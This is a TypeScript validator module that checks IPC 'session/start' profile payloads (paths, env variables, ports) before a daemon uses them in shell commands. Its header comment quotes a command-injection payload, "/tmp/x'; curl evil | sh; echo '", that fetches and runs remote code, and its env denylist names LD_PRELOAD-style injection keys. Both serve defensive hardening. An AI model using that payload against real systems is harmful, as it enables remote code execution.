// Wire-payload validator for session/start. Profiles arrive from the
// IPC socket — untrusted until proven otherwise — and downstream code
// in `bootSessionServices` interpolates `profile.worktree` into shell
// commands and spreads `profile.env` into subprocess environments.
//
// Security review P0: a `session/start { profile: { worktree: "/tmp/x';
// curl evil | sh; echo '" } }` was enough to RCE as the daemon user
// before this guard existed. The socket is 0o600 so the RPC caller is
// already the same UID, but code that can reach the socket (Electron
// renderer, Node postinstalls on modules that slip past
// --ignore-scripts) gets a shorter path to arbitrary command
// execution than it should. Validating the payload here plus
// argv-form spawns downstream close the pivot.

import type { Profile, Platform, RunMode } from "../core/types.js";

/**
 * Branded `Profile` minted only by `validateProfile`. The brand is a
 * phantom (zero runtime cost) but the type system refuses to let an
 * unvalidated `Profile` flow into APIs that accept `ValidatedProfile`.
 *
 * Required by the H1 hook system: every entry point that fires a hook
 * (RPC handler, MCP tool, in-process call) re-runs `validateProfile`
 * to mint a `ValidatedProfile`, so the hook spawn boundary cannot be
 * reached with attacker-controlled fields like `LD_PRELOAD` smuggled in
 * via a fresh `Profile` object literal.
 */
declare const ValidatedProfileBrand: unique symbol;
export type ValidatedProfile = Profile & {
  readonly [ValidatedProfileBrand]: true;
};

export type ValidateProfileResult =
  | { ok: true; profile: ValidatedProfile }
  | { ok: false; code: string; message: string };

/**
 * Shared guard result for the lower-level validators (path / env dict).
 * These are exported so other daemon RPC handlers — `builder/build`
 * accepts `projectRoot` + `env` on the same threat surface as
 * `session/start` — can reuse the same checks instead of re-inventing
 * looser variants. Every new RPC that takes a path or env dict from
 * the wire MUST go through these.
 */
export type GuardCheckResult =
  | { ok: true }
  | { ok: false; code: string; message: string };

const VALID_PLATFORMS: ReadonlySet<Platform> = new Set<Platform>([
  "ios",
  "android",
  "both",
]);

const VALID_MODES: ReadonlySet<RunMode> = new Set<RunMode>([
  "clean",
  "dirty",
  "quick",
  "ultra-clean",
]);

/**
 * ENV_ALLOWLIST — keys that may be set on a subprocess via `profile.env`.
 *
 * LD_PRELOAD / DYLD_INSERT_LIBRARIES / NODE_OPTIONS let an RPC caller
 * inject code into every spawned child. Node-side keys live in the
 * denylist below; everything not on this positive allowlist is
 * rejected. Adding a new key is a deliberate act.
 */
const ENV_KEY_PATTERN = /^[A-Za-z_][A-Za-z0-9_]*$/;
const ENV_KEY_DENYLIST: ReadonlyArray<string | RegExp> = [
  /^LD_/,
  /^DYLD_/,
  "NODE_OPTIONS",
  "NODE_PATH",
  "NODE_PRESERVE_SYMLINKS",
  "NODE_REPL_EXTERNAL_MODULE",
  "PATH",
  "IFS",
  "PS4",
];

export function validateProfile(input: unknown): ValidateProfileResult {
  if (!input || typeof input !== "object") {
    return fail("E_PROFILE_NOT_OBJECT", "profile must be an object");
  }
  const p = input as Record<string, unknown>;

  const name = p.name;
  if (typeof name !== "string" || name.length === 0 || name.length > 256) {
    return fail("E_PROFILE_NAME", "profile.name must be a non-empty string ≤256 chars");
  }
  // Reject \n and \r in name — parity with `checkAbsolutePath`. Required
  // because name flows into `RN_DEV_PROFILE_JSON` env var; embedded
  // newlines desync the JSON-line parser on the receiving end (H1 hook
  // subprocess runner).
  if (name.includes("\n") || name.includes("\r")) {
    return fail(
      "E_PROFILE_NAME_NEWLINE",
      "profile.name must not contain newline characters",
    );
  }

  if (typeof p.isDefault !== "boolean") {
    return fail("E_PROFILE_IS_DEFAULT", "profile.isDefault must be boolean");
  }

  const worktreeCheck = checkOptionalPath(p.worktree, "profile.worktree");
  if (!worktreeCheck.ok) return worktreeCheck;

  if (typeof p.branch !== "string" || p.branch.length > 256) {
    return fail("E_PROFILE_BRANCH", "profile.branch must be a string ≤256 chars");
  }

  if (!VALID_PLATFORMS.has(p.platform as Platform)) {
    return fail(
      "E_PROFILE_PLATFORM",
      "profile.platform must be one of ios | android | both",
    );
  }

  if (!VALID_MODES.has(p.mode as RunMode)) {
    return fail(
      "E_PROFILE_MODE",
      "profile.mode must be one of clean | dirty | quick | ultra-clean",
    );
  }

  if (
    typeof p.metroPort !== "number" ||
    !Number.isFinite(p.metroPort) ||
    !Number.isInteger(p.metroPort) ||
    p.metroPort < 1 ||
    p.metroPort > 65535
  ) {
    return fail(
      "E_PROFILE_METRO_PORT",
      "profile.metroPort must be an integer in [1, 65535]",
    );
  }

  const devicesCheck = checkDevices(p.devices);
  if (!devicesCheck.ok) return devicesCheck;

  if (typeof p.buildVariant !== "string" || p.buildVariant.length === 0) {
    return fail("E_PROFILE_BUILD_VARIANT", "profile.buildVariant required");
  }

  const preflightCheck = checkPreflight(p.preflight);
  if (!preflightCheck.ok) return preflightCheck;

  if (!Array.isArray(p.onSave)) {
    return fail("E_PROFILE_ONSAVE", "profile.onSave must be an array");
  }

  const envCheck = checkEnv(p.env, "profile.env");
  if (!envCheck.ok) return envCheck;

  const projectRootCheck = checkAbsolutePath(p.projectRoot, "profile.projectRoot");
  if (!projectRootCheck.ok) return projectRootCheck;

  // scheme + configuration are optional; if present, reject empty
  // strings so the build doesn't silently swallow a malformed profile
  // (an empty scheme would build whatever RN CLI's default heuristic
  // picks, which is the bug we're trying to escape).
  if (p.scheme !== undefined) {
    if (typeof p.scheme !== "string" || p.scheme.length === 0) {
      return fail(
        "E_PROFILE_SCHEME",
        "profile.scheme must be a non-empty string when present",
      );
    }
  }
  if (p.configuration !== undefined) {
    if (typeof p.configuration !== "string" || p.configuration.length === 0) {
      return fail(
        "E_PROFILE_CONFIGURATION",
        "profile.configuration must be a non-empty string when present",
      );
    }
  }

  // Input is now shape-safe; mint the branded type so downstream APIs
  // that require a validated profile (e.g. HookManager.fire) accept it.
  return { ok: true, profile: input as ValidatedProfile };
}

function checkOptionalPath(
  value: unknown,
  field: string,
): GuardCheckResult {
  if (value === null || value === undefined) return { ok: true };
  return checkAbsolutePath(value, field);
}

/**
 * Validate an absolute path string accepted over the IPC socket.
 * Rejects empty, oversized, relative, or control-char-laden values.
 * Shared by `profile.projectRoot` / `profile.worktree` (session/start)
 * and `builder/build.projectRoot` (client RPC).
 */
export function checkAbsolutePath(
  value: unknown,
  field: string,
): GuardCheckResult {
  if (typeof value !== "string") {
    return fail("E_PROFILE_PATH_NOT_STRING", `${field} must be a string`);
  }
  if (value.length === 0 || value.length > 4096) {
    return fail("E_PROFILE_PATH_LENGTH", `${field} length out of range`);
  }
  if (!value.startsWith("/")) {
    return fail("E_PROFILE_PATH_NOT_ABSOLUTE", `${field} must be absolute`);
  }
  if (value.includes("\0")) {
    return fail("E_PROFILE_PATH_NUL", `${field} must not contain NUL`);
  }
  if (value.includes("\n") || value.includes("\r")) {
    return fail(
      "E_PROFILE_PATH_NEWLINE",
      `${field} must not contain newline characters`,
    );
  }
  return { ok: true };
}

function checkDevices(value: unknown): GuardCheckResult {
  if (value === undefined || value === null) return { ok: true };
  if (typeof value !== "object") {
    return fail("E_PROFILE_DEVICES", "profile.devices must be an object");
  }
  const d = value as Record<string, unknown>;
  for (const k of ["ios", "android"] as const) {
    // Profile.devices.{ios,android} is typed `string | null | undefined`
    // ([src/core/types.ts:23-26]) — the wizard writes `null` for slots
    // the user didn't configure. Treat null and undefined identically.
    if (d[k] === undefined || d[k] === null) continue;
    if (typeof d[k] !== "string") {
      return fail("E_PROFILE_DEVICE_ID", `profile.devices.${k} must be a string or null`);
    }
  }
  return { ok: true };
}

function checkPreflight(value: unknown): GuardCheckResult {
  if (!value || typeof value !== "object") {
    return fail("E_PROFILE_PREFLIGHT", "profile.preflight must be an object");
  }
  const pf = value as Record<string, unknown>;
  if (!Array.isArray(pf.checks)) {
    return fail(
      "E_PROFILE_PREFLIGHT_CHECKS",
      "profile.preflight.checks must be an array",
    );
  }
  if (pf.frequency !== "always" && pf.frequency !== "once") {
    return fail(
      "E_PROFILE_PREFLIGHT_FREQ",
      "profile.preflight.frequency must be 'always' or 'once'",
    );
  }
  return { ok: true };
}

/**
 * Validate an env-dict accepted over the IPC socket. Enforces the
 * `LD_` / `DYLD_` / `NODE_OPTIONS` / `PATH` / `IFS` / `PS4` denylist
 * that prevents a wire-level caller from injecting code into spawned
 * subprocesses.
 *
 * Shared by `profile.env` (session/start) and `builder/build.env`
 * (client RPC). The two RPCs MUST use the same denylist — Security
 * P0-1 on PR #17 found that `builder/build` originally accepted env
 * with no checks, reopening LD_PRELOAD as an RCE pivot.
 */
export function checkEnv(value: unknown, field: string): GuardCheckResult {
  if (value === undefined || value === null) return { ok: true };
  if (typeof value !== "object" || Array.isArray(value)) {
    return fail("E_PROFILE_ENV", `${field} must be an object`);
  }
  for (const [k, v] of Object.entries(value as Record<string, unknown>)) {
    if (!ENV_KEY_PATTERN.test(k)) {
      return fail(
        "E_PROFILE_ENV_KEY",
        `${field} key "${k}" must match /^[A-Za-z_][A-Za-z0-9_]*$/`,
      );
    }
    for (const banned of ENV_KEY_DENYLIST) {
      if (typeof banned === "string" ? banned === k : banned.test(k)) {
        return fail(
          "E_PROFILE_ENV_BANNED",
          `${field} key "${k}" is on the denylist (LD_*, DYLD_*, NODE_OPTIONS, PATH, etc.)`,
        );
      }
    }
    if (typeof v !== "string") {
      return fail(
        "E_PROFILE_ENV_VALUE_TYPE",
        `${field}["${k}"] must be a string`,
      );
    }
    if (v.includes("\0")) {
      return fail(
        "E_PROFILE_ENV_VALUE_NUL",
        `${field}["${k}"] must not contain NUL`,
      );
    }
  }
  return { ok: true };
}

function fail(code: string, message: string): ValidateProfileResult {
  return { ok: false, code, message };
}
